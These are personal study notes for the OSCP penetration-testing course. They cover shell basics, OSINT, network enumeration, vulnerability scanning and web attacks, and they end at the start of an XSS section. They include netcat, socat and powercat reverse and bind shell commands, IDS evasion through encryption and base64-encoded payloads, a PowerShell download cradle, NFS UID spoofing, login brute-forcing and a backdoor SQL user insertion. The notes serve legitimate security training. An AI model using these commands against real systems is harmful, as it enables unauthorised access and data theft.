OSCP
================================================================================

#shell commands
https://msadministrator.files.wordpress.com/2012/10/linux-windows-comparison-of-commands.pdf
[cheat_sheet](cheat_sheet)
----------------------------------------------------------------------
#windows
`dir` is the same as `ls`
`type` is same as cat
`echo <stuff> >> tgt_file.txt` will append to end of file
----------------------------------------------------------------------
#*unix
    When sshed into windows from kali if term output just overwrites last line: 
        you can just send one cmd to ssh and disconnect: `ssh student@192.168.203.10 <command>`
        this will connect, run command, and disconnect givien you entire output

#PWK admin
    `rdesktop 192.168.203.10 -u [username] -p [password] -g [window size WxH] 1024x768 -x [RDP5] 0x80`
        to get from kali to windows box with remote desktop
    `rdesktop 192.168.203.44 -g 1024x768`
        to get from kali to debian box with remote desktop
----------------------------------------------------------------------
#Pen test cycle
    House keeping - cleaning up and Rootkits
    Maintaining access - trojans
    Penetration - BOs and SQL
    Service Enumeration - VPN, SNMP, Port Scanning, SND, SMTP
    Information - google, whois, www
    
#linux file system
    /bin/   all basic programs: ls, cd, cat
    /sbin/  system programs: sysctl
    /etc/   config files
    /tmp/   temp files deleted on boot
    /usr/bin/   apps: apt, nmap, ncat
    /usr/share/ app suppport and data files
    
#linux cmds
    `man -k <program>`
        keyword search a man file to find a particuler man file
    `apropos <info>`   
        searches man descriptions for your info and returns mans
    `ls -a1`
        lists all files with each on single line
    `mkdir -p test/{one,two,three}`
        will make the parent dir `test` with 3 children dirs inside each
        named `one, two, three`
    `which <name>`
        search dirs for the full path to the name. looks at $PATH
    `locate <name>`
        quickest. searching the `locate.db` for name. `updatedb` will update
        this instantly. otherwise its ran as a cron job
    `find <name>`
        complex and most capablie.
        can search by: `age, sixe, owner, file type, timesamp, permissions`
        `find / -name sdb*`
            will recursive search everything in `/` for anything starting with `sdb`
            
#services
    `ssh` tcp based encrypted on port 22
        `systemctl start ssh` to turn it on
        `ss -antlp | grep sshd` to confirm its on
        `systemctl enable ssh` to start on boot
    `http` apache used to host site or be platfrom for downloads port 80
        `systemctl start apcahe2`
    `systemctl list-unit-file` to see all services and status
    
#install tools
    `apt` package managment system
    `apt upgrade <package>`
        to just upgrade one thing
    `apt-cache search <package>`
        shows if its in the reposatory by searching package description
    `apt show <package> | less`
        to see the description
    `apt remove --purge <package>`
        completely removes package to include user configs unlike `remove`
    `dpkg -i </path/to/package.deb>`
        used to install core packages offline so it will not install online 
        required dependances
#bash
    base vars used to store info. use `echo` to see them
    `echo $PATH`
        will show our current path
    `$PWD`
        present working dir
    `$HOME`
        users home dir
    `$USER`
        current user
    `export b=10.10.10.1`
        will save the var `b` as the ip address in our current bash envorment
        session and survice more other instances. so `ping -c 2 $b` will ping  the ip twice
        if we just use `var="my var"` it only be saved in the current instance
        of bash
        
    `my_var=$(command or serise of commands)`
        to save the output of a command or many |ed commands add `()` around
        them when you save the var
    
    `env`
        to see all enviroment vars
    `history`
        to see bash history
    `!<line number>`
        to run a command form history by line number
    `!!`
        run last command
    `$HISTSIZE`
        size of history saved. can change in `bash.rc`
    `Ctrl+R` 
        lets us type letters and it will search history
    each command has 3 steams:
        `STDIN` standard input `0`: data fed into program
        `STDOUT` standard output `1`: ouput from program, defualt to term
        `STDERR` standard error `2`: error messages, defaults to term
    `|` 
        pipe from left to right side
    `>`
        redirect output form term to file, will overwrite
    `>>`
        append output to file without overwritting it
    `<`
        redirect from file. take output from right side and give it as
        input to the left size
    `ls ./test 2>error.txt`
        will list /test which will display an error. so instead of printing
        the error to term it will add it to a file `error.txt` instead
        
    #searching and manipulation
        `grep`
            search output for data. 
            `-r` recursive 
            `-i` ignore case
            `-v` reverse search and only display lines NOT with input
            `[^/]` negated set, will search for all charters except `/`
            `-o '[^/]*\.megacorpone\.com'` the `\` treats the `.` as a real period
                this would search for anything ending in `.megacorpone.com`.
                the `-o` only pulls out the string and not just prints the whole
                line.
        `host`
            lets us pull out host ips form a list
            `for url in $(cat list.txt); do host $url; done`
        `sed`
            stream editor. `echo "here is me" | sed 's/me/you/'`
            will print `here is me` normally. But here before the stream
            is printed, `sed` substitutes `me` for `you` and prints `here is you`
        `cut`
            take a section of line and redirect to `STDOUT`
            `-f` for feild, `-d` for delimiter
            `echo "you,him,me" | cut -f 2 -d ","` will only print `him`
            can only take a single field, `awk` can take more
        `awk`
            programming language for data extraction and reporting tool.
            `-F` field separator. `print` to display.
            `echo "first::second::third" | awk -F "::" '{print $1, $3}'`
            will print `first third`
            this can make delimiters any size such as `-F "http://"`
        `head`
            displays the first 10 lines of a file
        `wc -l <file>`
            will give the total number of lines in a file
        `sort -u`
            sorts unique to only see unique lines
        `uniq -c`
            will display unique text with the number of times seen in front of
            it
    
    #compairing files
        `comm`
            compares two files and displays common lines and unique lines
            left side is unique to 1st, mid is unique to 2nd, and right is
            shared by both files. `-n 2` will suppress column 2 
        `diff`
            shows diffrence in two files. `-c` context format. `-` shows line
            is in first file but not second. `+` shows line in second but not
            first. `-u` same but anyline without an indicater is in both files
        `vimdiff`
            opens `vim` with both files open and highlighted to show
            differences. `ctrl+w+arrow` changes window. `[+c` will jump to
            previous difference and `]+c` to next diff. `d+o` put change in 
            current window. `d+p` will take from current and place in other.
    
    #manage process
        `<cmd> &`
            background command.
        `ctrl+z`
            pause current command and background
        `bg`
            will resume paused command and run in background
        `jobs`
            display all backgrounded jobs by number
        `fg`
            to bring backgrounded process and run in foreground. Run `jobs`
            to see all job numbers and `fg %<job number>` to `fg` that job. can
            also use the cmd name or process id to reference them.
        `ps`
            system wide process status. once you get a shell always check 
            what processes are running on the tgt to see if we can use them.
            `-ef` select all process and so full listing. `-fC <cmd name>` will
            give full listing of any processes with that cmd name.
        `kill <PID>`
            kill the process with that PID.
   
    #file and cmd monitoring
        `tail`
            monitor the end of a file.`-f` will keep output updated in
            real-time. `-n <X>` output the last X number of lines
        `watch`
            run a cmd at regular intervals, default is 2 secs. `-n <X>` run every
            X secs. `ctrl+c` will exit `watch`
        
    #download files
        `wget`
            downloads via `ftp` and `http` protocols. `-O` to download and
            change name.
        `curl`
            transfer data to and from server. `-o` to change output file name.
        `axel`
            download accelerator that downloads from `ftp` or `http` thru
            multiple connections. `-n` number of multiple connections.`-o`
            change output file name. `-a` more concise progress indicator.
    
    #customize bash
        `HISTCONTROL=ignoredups`
            the var to ignore duplicates in history
        `HISTIGNORE="&:ls:[bf]g:exit:history"`
            will not display common cmds in history
        `HISTTIMEFORMAT='%F %T '`
            to add date and time to history such as
            3 2019-04-23 11:29:45 clear
            can find other formats in `man strftime`
        `alias`
            used to display all custom alias.
        `alias lsa='ls -la'`
            will create the custom cmd `lsa` that runs `ls -la` for us.
        `/etc/bash/bash.rc`
            changes here are persistence. make changes to the one in the user
            home dir for that user to have persistent changes.
            
#practical tools
    `rdesktop`
        linux remote desktop connection to windows, linux, ect
        `rdesktop <ip> -u [username] -p [password] -g [window size WxH] 1024x768 -x [RDP5] 0x80`
    `netcat`
        hacker Swiss army knife. using `tcp` and `udp`. need `root` privs to
        bind privileged ports.
        `-n` skips dns resolution
        `-v` verbose
        `nc -n -v <ip> <port>`
            to see if port is open on ip
            if this were on port `110` and running `POP3` we could try
            to authenticate with `USER <name>` it would tell us if it is known
            there and then `PASS <password>` to try and login as that user.
        `-l` listen on a port
        `nc -nvlp 4444`
            sets up listener on port 4444. can add `> file.txt` to redirect any
            connection data to a file.
        `nc -nv <ip> <port>`
            connects to listener on ip and port
        `nc -nv <ip> <port> < full/path/to/file.txt`    
            will send `file.txt` over netcat
            can transfer both text and bin files with netcat
            *you might need to send your file to a tgt over `netcat` and 
            redirect the connection on tgt to a file IOT get it on the tgt
        `-e`
            * note: for catching a callback on linux you need to allow the port
                `sudo ufw allow <port>/tcp`
            * on raspberry pi to send a nc shell you need to remove nc and
              reinstall `netcat`
            will redirect the input, output, or error form an executable to
            `netcat` over a tcp or udp port. this can be used to bind `cmd.exe`
            to a `netcat` port so when we remote login to that port we get a 
            shell on windows.
                #netcat bind shell
                windows: has public ip
                linux: no public ip
                windows: `nc -nlvp 4444 -e cmd.exe`
                linux: `nc -nv <ip> 4444`
                this will give linux a cmd shell on tgt box. no creds needed.
                # netcat reverse shell
                windows: has public ip
                linux: has no public ip
                windows: `nc -nlvp 4444`
                linux: `nc -nv <ip> 4444 -e /bin/bash`
                gives windows a bash shell
               
    #Socat
        makes 2 bidirectional byte streams
        `socat - TCP4:<ip>:<port>`
            `-` takes standard input and give to remote host
        `socat TCP4-LISTEN:443 STDOUT`
            set up listener
            #file transfer
                linux: `socat TCP4-LISTEN:443, fork file:myfile.txt`
                    when a connection is made, `fork` will make a child process
                    of `file:myfile.txt` to transfer the file over the
                    connection
                windows: `socat TCP4:<ip>:443 file:rename_myfile.txt,create`
            #reverse shell
                windows: `socat -d -d TCP4-LISTEN:443 STDOUT`
                    sets up listener with `-d -d` for increase verbosity
                linux: `socat TCP4:<ip>:443 EXEC:/bin/bash`
                giving windows a bash shell on linux
            #encrypted bind shells
                will encrypt with ssl, openssl to help `evade IDS` so they can't
                    see what we are transferring.
                linux: `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
                    will make a self signed cert we can use for ssl with `req`
                    and `-x509`. `-nodes` will store the key unencrypted.
                    `-out` saves the cert to a file
                linux: `cat bind_shell.key bind_shell.crt > bind_shell.pem`
                    will combine both key files to a format, `.pem`, that
                    `socat` can use.
                linux: `socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
                    `verify=0` disables ssl verification
                windows: `socat - OPENSSL:<ip>:443,verify=0`
                giving windows an encrypted bash shell on the linux box
    #powershell and powercat
        windows task based cmd line shell and scripting language used for admin on
        multiple windows OSs. maintains and `execution policy` that defines
        what scrips can be ran on system. default is restricted.
        `run powershell as admin`
        `Set-ExecutionPolicy Unrestricted` then hit `Y`
        `Get-ExecutionPolicy` to check current policy
            `powershell` can be used to do additional things on tgt without
            having to install more tools on tgt
        also you can upgrade a `cmd` shell to powershell with `powershell`
        #powershell file trans
            linux: `cp /full/path/to/wget.exe /var/www/html/`
                this cps the program `wget` to our apache web server
            linux: `ssytemctl start apache2`
                start our self hosted web server
            windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<ip>/wget.exe', 'C:\Users\where\we\want\wget.exe')"`
                `-c` will execute the cmd in `""` as if it were input from
                a powershell shell.`new-object` lets us make a WebClient
                class and runs DownloadFile command
                could use this to get malware on windows tgts
        #powershell reverse shell ran from cmd
            linux: `nc -lvnp 443`
                set up nc listener on linux box
            windows: [psReverseShell oneliner](psReverseShell.oneliner)
            gives us cmd shell from windows on our linux box
        #powershell bind shell rna form cmd
            windows: `powershell -c "see kali videos: practical tools > powershell and bind shell 00:52"`
            linux: `nc -nv <ip> 443`
            to get a cmd shell on linux from windows
        #powercat ran from powershell
            nc in powershell
            `. ./powercat.ps1` to run powercat in just this powershell
            instance
            `-help` for commands
            #powercat file trans with powercat running
                linux: `nc -lnvp 443 > recived_file.ps1`
                windows: `powercat -c <ip> -p 443 -i C:\where\it\is\powercat.ps1`
            #powercat reverse shell with powercat running
                linux: `nc -lvp 443`
                windows: `powercat -c <op> -p 443 -e cmd.exe`
            #powercat bind shell with powercat running
                windows: `powercat -l -p 443 -e cmd.exe`
                linux: `nc -nv <ip> 443`
                get a cmd shell from windows running on linux
            #powercat stand alone payloads with powercat running
                linux: `nc -lnvp 443`
                windows: `powercat -c <ip> -p 443 -e cmd.exe -g > reverseshell.ps1`
                    `-g` make a payload to file.ps1
                windows: `./reverseshell.ps1`
                    this will give u a revers shell. however, IDS will see
                    this so we can encode it in base64 to try and get
                    around.
                windows: change `-g` to `-ge` to encode the payload
                windows: `powershell.exe -E <pasted in encoded payload text>`
                we get a reverse shell on linux
    #wireshark
        click on interface we want to use such as `tun0` and apply capture
        filters.
            `net 10.11.1.0/24`
                only display packets on that network
            display filters are used to filter more when looking at traffic
            `tcp.port == 21`
                shows only `ftp` traffic on port `21`
            following steams. `rc on packet> folow > tcp stream` will show us all the
            packets in order so we can see the entire communication
    #tcpdump
        terminal based capture traffic and read cap files
        `tcpdump -r file_with_traffic.pcap`
            displays tcp data from pcap
            `-n` skip DNS lookings
        pipe into `awk` to filter data
        `tcpdump -n -r file.pcap | awk -F" " '{print $3}' | sort | uniq -c | head`
            prints the destination address in field 3, sort and count unique ips
        `src host <ip>` show traffic from that host
        `dst host <ip>` show traffic dest for host
        `port 81` show traffic by port both source and dest
        `-X` prints in both hex and ASCII
        `-A` prints in ascii
        Advanced filtering: only display the data packets. in a header, the
        `ack` and `psh` flags turned on showing a connection attempt. They are
        the `4th` and `5th` `bit` of the `14th` byte. Turning on only these 
        bits would be decimal `24`.
        `tcpdump -A -n 'tcp[13] = 24' -r file.pcap`
            the tcp array index starts at 0 so `tcp[13]` is the `14th byte`
            that we are setting to decimal `24` to only show those data packets
    #bash scripting
       `''` everything inside is literal
       `""` everything inside is literal except for $ ` \
       `var1=$(whoami)`
        will save the output of the cmd `whoami` in `var1`
       `#!/bin/bash -x`
        will run with debugging on to display what is happing with script.
        `+` are run in current shell and `++` are run in a sub shell
       #arguments
        on `ls`, `-l` is an argument. in a script:
            `$0` is the name of the script
            `$1` the first argument passed to the script and so on
                [script.sh](script.sh)
                `./script.sh tim`
                would print: `hello tim`
            `$?` show exit status of last process 
            `$RANDOM` prints random number
       `read answer`
        to capture user input and assign to var `answer`
        `-p` prompt
            `read -p 'Username: ' username_var`
                displays prompt `Username: ` and saves to the var `username_var`
        `-s` silent so don't print input to term
        #if, else, elif
            [if](if)
            [else](else)
            [elif](elif)
        #boolean logical operations
            `&&` is `and` does right side if left side is true 0
            `||`  is `or` does right side if left side is false 1
        #loops
            `-lt` less than
            `-gt` greater than
            `-le` less than or equal too
            `-ge` greater than or equal too
            [for_loop](for_loop)
                this takes each item in list and in order, assign as value
                as var_name, do an thing, and then start again at the next
                listed item
                a single line: `for ip in $(seq 1 10); do echo 10.11.1.$ip; done`
                would print 10 ips starting at .1 and going to .10
                can use sequence experssion: replace `$(seq 1 10)` with `{1..10}`
            [while_loop](while_loop)
               can add a `((counter_var++))` to increase a counter
        #functions
            script within a script. a subroutine
            [functions](functions)
            for C:
            [C_functions](C_functions)
            can pass an argument to a function with `function_name $varname`
                we just need to be sure that `$1` is in the function so it
                knows what to do with `$varname`. you can have as many
                arguments as you want in order. Function must be defined before 
                it is called in a script.
            #variable scope
                where it has meaning
                `global variable` can be access thru entire scirpt
                `local variable` can only be used in the funtion or block of
                code it is defined. `local $PATH` would change the path
                just locally in a function and not effect it outside the
                function.
        
        #search thru exploits from exploitdb for our use case
            we want to exploit `afd` on windows
            `searchsploit afd windows -w -t`
                `-w` for url location
                `-t` for exploit title
            `searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"`
                to just get all the urls we need
            [searchsploit_downloader_sh](searchsploit_downloader_sh)
            sets `exp_name` to the name of the exploit. `sed` subs the url
            for the raw version.saves as the local file name `exp_name`
            
#OSINT
----------------------------------------------------------------------
#website recon
about/contact pages for emails, phones, POCs, and social media
    `whois <website> | less`
        gets domain register info such as: register name, name servers,
        ect. `whois <ip> | less` reverse look up to see how is hosting it
#google hacking
    `site:` results only form that site domain
    `filetype:` results only that type of file
    `-` in front of an operator will exclude that
        `-filetype:pdf` will not show pdfs
    `intitle:"index of" "parent directory"` looks for misconfigured pages
    that have directory listing pages that list the file contents without
    index pages.
    https://www.exploit-db.com/google-hacking-database
#netcraft
    https://www.netcraft.com
        can Search DNS to get more info on a domain.
        Site Report > Site Technology will tell you alot of services the 
        domain uses.
#recon-ng
    is a framework like metasploit used to recon websites
    `recon-ng`
        to start up
    `marketplace search <term>` 
        looks up modules that you can install. `*` means it needs an API
        some are free and some are
        not.https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys
        has the list of keys.
    `marketplace info <mod name>`
        to get more info about them
    `marketplace install <mod name>`
    `marketplace install all` to get all that don't need keys
    `modules load <mod name>`
        when loaded `info` will displace the options
        `options set source <website>` to set a target
        `run` to do recon
        `back` to unload a module
    stores the results in a database
        `show hosts` to see stored data
    `marketplace install recon/domains-hosts/google_site_web`
    `marketplace install recon/domains-hosts/bing_site_web`
        are good for finding domains
    `info recon/hosts-hosts/resolve`
        will find IPs for those domains
    https://www.youtube.com/watch?v=oSt6WdTaCV4
        for great recon modules and more tutorial
#Open-Source Code
    github, gitlab, sourceforge
    look here for company data leaks
    can use google hacking in these sites searches
    `user:<company_username> filename:users`
        to search for a data like about user names, like a xampp.users
    `gitrob` and `gitleaks` are tools you can use for larger repos
#shodan.io
    crawls all devices on the internet, servers, iot, routers
    good for finding ssh servers for domains
    `hostname:megacorpone.com`
        will show server info
        then you can click on an ip to get more info:
            services, ports, and known CVEs!!!
#security headers scanner
    https://securityheaders.com/
    will give common defensive headers that are missing, might be a way in
#ssl server test
    https://www.ssllabs.com/ssltest/
    checks a servers ssl tls config against best practices
#pastbin
    https://pastebin.com/
    search it for basic stuff or use the api for advanced - NOT anymore
#user info gathering
    build user and password list, augment phishing, pretexing for SE, 
    cred stuffing
    #email harvesting
        `theHarvester -d <domain> -b google`
        https://blackhattutorial.com/theharvester-advanced-information-gathering-tool/
        `theHarvester -help`
        can find emails, subdomains, ips
    #social media tools
        https://www.social-searcher.com/
        searches social media for accounts and posts
        https://digi.ninja/projects/twofi.php
            site specific for twitter that takes a user's account
            and makes a password list based on them. needs a twitter
            api key
        https://github.com/initstring/linkedin2username
            site specific for linkedin makes a username list. needs a
            linkedin account to point at an organization
        https://www.stackoverflow.com
            look up a user and see what he is asking or answering to get
            more background info on him or his company
#info gathering frameworks
    #OSINT Framwork
        https://osintframework.com/
    #maltego
        data mining tool, do search and then use info to find other data

#Active info gathering
----------------------------------------------------------------------
#DNS enumeration
`host <domain>`
        find ip for domain names
        `-t` will find different types of records
            `mx` is email
            `txt` other data
            `ns` domain name servers. can try a zone transfer on them
    #forward lookup brute force
        use `host` to confirm a domain has an ip in DNS. by putting
        different text in front of the domain we might find one such as
        `amireal.megacorpone.com` so brute force it
        `for ip in $(cat list.txt); do host $ip.megacorpone.com; done`
            use a word list with common host names from `/usr/shares/dns*`
            `apt install seclists` installs to `/usr/share/seclists`
    #reverse lookup brute force
        use `host` to figure out the ip scheme and scan for ips that might
        be there
        `for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"`
    #DNS zone transfer
        can be misconfigured and anyone who wants the zone will get it.
        it should be set up to prevent this
        `host -t ns <domain>`
            to get a list of domain name servers
        `host -l <domain> <domain server>`
            to try and get a zone transfer request approved
        [dns_zone_transfer_script](dns_zone_transfer_script)
    #DNSrecon
        `dnsrecon -d megacorpone.com -t axfr`
            dns zone transfer dump
        `dnsrecon -d megacorpone.com -D <absolut/path/list.txt> -t brt`
            brute for hostnames
    #DNSenum
        `dnsenum <domain name server with zone>`
            zonetransfer.me is a good test
            to get a zone file
    #port scanning
        #TCP scanning
            handshake
            host    `syn`       server
            server  `syn,ack`   host 
            host    `ack`       server
            host   `fin,ack`   server (to close the connection)
            `nc -nvv -w 1 -z <ip> <port-ports>`
                simple tcp scan
        #UDP scanning
            stateless / no handshake needed
            host    `datagram`   server
            server  `Destination unreachable` (icmp)   host
            if open, the request is sent to the `application layer` and 
            application respondes diffrently
            `nc -nv -u -z -w 1 <ip>  <port-ports>`
                `-u` udp scann
            *udp scanning is unreliable cuz most firewall drop icmp
            packets. Can show false positives.
        #nmap
            1000 port default scan sends about 70kb of traffic
            `-p-` sends about 4mbs of traffic
            `-sS` default scan, with sudo, is `syn steal` scan by not sending part 3 or the
                handshake. faster cuz less packets are sent and server never
                passes to the application layer so it isn't logged. however,
                firewalls will log this most of the time now.
            `-sT` connect scan when u don't have sudo or when scaning thru
            proxies
            `sU` udp scan with both empty packets or snmp packet
            `-sS -sU` to do tcp and udp
            #network sweeping
                `nmap -sn 10.1.12.1-254`
                    to host discovery all ips in range sends tcp syn 433,
                    tcp ack 80, icmp time stamp, icmp
                `-oG tgt-nmap.txt` so its grepableable
                `nmap -p 80 10.1.12.1-254 -oG web-sweep.txt`
                    scan for hosts with tcp 80 open
                    `grep open web-sweep.txt | cut -d" " -f2`
                        just show the ips
                `nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt`
                    web sweep for top 20 common ports
                `cat /usr/share/nmap/nmap-services`
                    to see what the top ports are by default
                `-O` os fingerprinting
                `-sV` open ports services and versions
                `-A` all scan: os, services, versions
                #script scanning
                `/usr/share/nmap/scripts` for nmap scripts
                `--script=<script name>`
                    to add a script to the scan
                `nmap <ip> --script=smb-os-discovery`
                    attempts to connect to smb and determine OS
                `--script=dns-zone-transfer -p 53 <domain name server.com>`
                    for zone transfer
                `nmap --script-help <script name>`
                    to get a man for the script
            #masscan
                can scan entire internet in about 6mins
                `sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1`
                    scan entire class C network
            #smb enum
                #scan for NetBios
                    port 139 tcp and several udp ports, 445 smb is seperate
                    protocal.NetBios on tcp is required for smb for
                    backwards compatabliity and offten enable together.
                    `nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`
                        to scan for `smb 445` and `NetBios 139`
                    `nbtscan -r 10.11.1.0/24`
                        to scan for vaild netbios names
                    `/usr/share/nmap/scripts/smb*`
                        for nmap smb specific scripts
                    `--script=smb-os-discovery`
                        to match os running smb
                    `--script=smb-vuln*`
                        to check if smb is vul to common CVE
                        `--script-args=unsafe= 1 10.11.1.xxx`
                            will CRASH vul system so do NOT use
            #nfs enum
                file sytem protocal to acess files over network as if
                they were on the local storage, common on *unix. often
                set up wrong and open to all
                #scanning for nfs shares
                    `Portmapper` and `RPCbind` are on `port 111`. page 202
                    section 7.4.1 of OSCP.pdf
                    `nmap -sV -p 111 --script=rpcinfo 10.11.1.1.-254`
                        to check ips to find services that have registered
                        with RPCbind.
                    then run `nmap =p 111 --script nfs* 10.11.1.xx`
                        to run all 3 scripts to see if we can access shared
                        dirs. if so, we can mount the dir and access the
                        files. so if we found `/home <ip>/<cidr>`
                    `mkdir home`
                    `mount -o nolock 10.11.1.72:/home ~/home/`
                        `-o nolock` disable file locking for older NFS
                    if we try to access a file here and get `permision denied`.
                    `ls -la` might show:
                    `-rwx------ 1 1014 1014 file.txt` this has an `UUID 1014`
                    with `rwx` permissions. create a new user on
                    our local kali box with the same UUID (group) and permissions.
                    our new user has a defualt UUID of 1001
                    `adduser pwn`
                    `sed -i -e 's/1001/1014/g' /etc/passwd`
                        `-i` for substitution
                        `-e` to run the script to cahnge from 1001 to 1014
                    `su pwn`
                    `id`
                        to display our UID
                        now you can read the file!
            #SMTP enum 
                simple mail transfer protocal.`VRFY` asks server to
                verifiy an email adress. `EXPN` gets the users  on
                the server.
                `nc -nv <ip> 25`
                    `VRFY <user>`
                        will check to see if the user is on the server
                        can brute force this
                    [username_smtp_bruteforce](username_smtp_bruteforce)
                        this works by adding a username as an arg
                        but we can feed a wordlist into this
            #SNMP enum
                simple network managment protocal. easy to misconfiger
                UDP base. can be ip spoofed and ip replay attacked
                1, 2, 2c modes have no encrypted.
                #SNMP MIB tree - managment information tree
                    branches repersent diffrent orgs or network functions
                    and leaves (final endpoints) correspond to specific
                    vars that can be accessed and probed
                #scan for SNMP
                    `sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt`
                        `-sU` udp
                        `--open` only display open ports
                #bruteforce SNMP servers
                    we can try brute forcing these tgts with tool `onesixtyone`
                    [community_strings](community_strings)
                        make a list of community str
                    `for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips`
                        make a list of ips to bruteforce
                    `onesixtyone -c community_strings -i ips`
                        this will show which SNMP services are on and we
                        can query them for MIB data
                    #windows SNMP enum
                        if we know the `SNMP rea-only community string` we
                        can use `snmpwalk` to enum. the default is `public`
                        `snmpwalk -c public -v1 -t 10 <ip>`
                            enum entire MIB tree
                            `-v1` version 1
                            `-t 10` increase timout to 10 secs
                            *the numbers at the end of the cmds are OIDs
                            and can be looked up
                                https://bestmonitoringtools.com/mibdb/mibdb_search.php
                        `snmpwalk -c public -v1 <ip> 1.3.6.1.4.1.77.1.2.25`
                            enum windows users
                        `snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2`
                            enum windows running processes
                        `snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3`
                            enum windows open TCP ports
                        `snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2`
                            enum windows installed software

#Vulnerability Scanning
    an auto scanner will:
        detect if tgt is up and running
        conduct full or partial port scan
        ID the OS 
        ID running services
        signature matching process to discover vulns
    signature mismatch will give false pos and negs so keep signature database
    updated!
    #nessus
        130,000 plugins!
        install from https://www.tenable.com/downloads/nessus?loginAttempted=true
        `/bin/systemctl start nessusd.service`
            to start
        https://kali:8834/
            to get to gui and login
        new scan > basic network scan > enter info
            to do a vuln scan for a tgt or tgts
            #unauthenticated scann
            `discovery`
                then you get more options under `discovery`
                `port scanning` > port scan range 0-65535
                click the arrow next to `save` at bottom to `launch`
                most likely to lead to compromise
                    vulnerabilities > filter > `exploits availiable` > apply
                    shows vulns in groups with exploits
                    click `gear icon` > disable groups
                        to see all vulns by severity on single page
            #authenticated scanning
                you need tgt creds for increase accurassy
                new scan > `credentialed patch audit`
                    scan for patchs and outdated software
                credentials > ssh > authentication method > passwordA
                    set user and password
                    you can also use other auth methods with categories > all
            #scan with individual plugins
                new scan > advanced scan
                to be quiet and since we know the host is up
                    discovery > host discovery > turn off `ping the remote host`
                port scanning > port we want to scan or range
                    uncheck all local port enumerators optionsA
                plugins > disable all > select plugins you want!
                click on servies on left collum > then add plugins on right
                column
                *some vulnerablities when expanded will show `Output`
                the `info` outputs are result based with more stuff
    #nmap
        `/usr/share/nmap/scripts/scripts.db`
            is the list of scripts by catagory
        `cat /usr/share/nmap/scripts/script.db | grep '"vuln"\|"exploit"'`
            to just display the vuln and exploits categories
        `nmap -script vuln <ip>`
            will run all vuln catagoied scripts on tgt
            look for `VULNERABLE` to see if its vul to a current CVE
            
#web application attacks
    https://owasp.org/www-project-top-ten/
    #web app assessment methodology
        what does it do
        what lang
        what server soft is it running on
    #web app enum
        these are tech agnostic but we might need to craft exploits for them
        the tech stack:
            program lang and framworks
            web server soft
            database soft
            server OS
        #inspect urls
            file extentions can id langs but with routes this is rare
        #inspect page content
            rc > inspect source > debugger
                at the bottom `{}` is the pretty print so condenced code is
                expanded and easyer to read.
            inspector lets us drill down into a specific part of a web page
                rc on item > inspect element
            network lets you inspect server responce headers
                network > refresh the page
                    server header will show name of server software and
                    sometimes the version numberA
                    headers that start wtih `X-` are non-standard http headers
        #inspecting sitemaps
            used to help web crawlers see or not see pages
            `robots.txt` and `sitemap.xml` are most common
            `curl https://www.google.com/robots.txt`
                to pull one
        #locating admin consoles
            common missconfigured ones:
                Tomcat /manager/html
                MySQL /phpmyadmin
        #DIRB
            terminal based DirBuster
            web content scanner to bust directories
            `dirb http://www.megacorpone.com -r -z 10`
                `-r` non-recursive
                `-z 10` 10 millisec delay
                by defualt will do recursive to drill into dirs
                do non-recursive to find dirs then do recursive to drill into
                the ones you find!
        #Burp Suite
          
        #Nikto
            used to scan servers and will tell you what is out of date or might
            be exploitable. for low hanging fruit, reporting none standard server
            headers, and server config errors.
            pretty loud and can take several hours to complete an entire
            server. 
            `-maxtime` will stop after sertive time
            `-T` tune, to configure just certan tests to lower time
            `nikto -host=http://www.megacorpone.com -maxtime=30s`
                basic scan of only 30 secs
    #exploiting web vulns                
        *PWD p.348 for practice with gadgets-1.0.0.jar!
        #admin consoles
            `dirb http://<ip or site> -r`
                to find urls that have admin consoles:
                    `Tomcat /manager/html`
                    `MySQL /phpmyadmin`
                        `phpMyAdmin\config.inc.php` is the config file
                put that into the browser and look up default creds
                if not use `burp suite intruder` to brute force a web login
                page.
                    #burp suite intruder: bruteforce web site login
                        example is with `phpMyAdmin`
                        `proxy > http > history` will show a `POST` request of
                        our failed log in attempt.
                        `token=` and `set_session=` are parmis that are unique for each
                            request to prevent brute forcing. The  parms 
                            must match the site's cookie. In the
                            `response` at the bottom we can see the NEXT
                            `set_session=` and `token=` will be!
                        `rc POST > send to intruder`
                        `Positions tab` > `clear` > so we can set our own
                            payload locations
                        set the password, cookie, set_session, and token data
                            to `add` as payload locations.
                        `attack type Pitchfork` lets us set diffrent payloads
                            for each postion
                        `options tab` > `Grep - Extract` will search the `POST responce`
                            of a failed attempt for the next token and cookie
                            so we can use them as payloads for the next
                            attempt.
                            `new` > go to the end of the `responce` and find
                                the `hidden set_session` value and highlight it.
                                Do the same for `token` in the hidden section.
                            `payloads tab` > `payload set` is in order and each
                                one needs to be set.`payload type` > `recurisive grep`
                                and select the payload option, then put random
                                number in `initial payload for first request`. Do
                                same for other payload locations needed recurisive
                                grep fields. for `password` payload location use
                                `payload type` > `Simple list` and copy and paste a
                                password list in the payload options.
                                *`tokens` can have special charaters so at the
                                bottom uncheck the URL-encode these charaters
                            `start attack` we are looking for somthing other
                                than the 200 Status as failed such as 302. might
                                also see an `pmaAuth-1 cookie` that might be a
                                successful login.
                            log in and `webappdb` is the tgt in this example
                            from `phpmyadmin` > `SQL` > `select * from webappdb.users;`
                                to do an SQL query for all the users and
                                passwords for the db. 
                                `insert into webappdb.users(password, username) VALUES(”backdoor“,”backdoor“);`
                                    will add a backdoor user into the SQL db.
        #XSS cross-site scripting
            https://owasp.org/www-community/xss-filter-evasion-cheatsheet
            data sanitization is were user input data is processed
                and removing all dangours charters or stings. without
                it we can `inject` malcode. on a web page, this is
                XSS. The users browsers exicutes the payload not
                the web app.
                `stored XSS attacks` or `Persistent XSS` exploit
                    payload is stored in a db or cached by the server
